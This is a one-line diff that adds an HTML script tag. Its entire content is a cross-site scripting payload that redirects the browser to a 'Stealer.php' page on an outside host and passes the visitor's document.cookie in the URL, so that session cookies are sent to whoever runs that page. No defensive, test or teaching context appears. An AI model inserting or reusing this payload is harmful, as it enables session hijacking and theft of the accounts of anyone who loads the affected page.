@@ -1,0 +1,1 @@
+<script>location.href='http://apollo.eed.usv.ro/~berches.antonela/aplicatie_atac/Stealer.php?cookie='+document.cookie;</script>
